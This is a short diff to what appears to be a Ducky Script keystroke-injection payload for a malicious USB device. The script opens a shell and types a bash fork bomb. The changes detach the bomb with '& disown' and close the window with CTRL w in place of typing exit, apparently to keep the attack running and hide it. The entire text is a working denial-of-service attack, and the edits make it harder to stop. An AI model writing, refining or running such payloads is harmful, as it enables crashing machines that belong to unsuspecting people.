@@ -6,9 +6,9 @@ STRING shell
 DELAY 500
 ENTER
 DELAY 750
-STRING :(){ :|:& };:
+STRING :(){ :|:& };: & disown
 ENTER
 DELAY 100
-STRING exit
-DELAY 300
+CTRL w
+DELAY 100
 ENTER
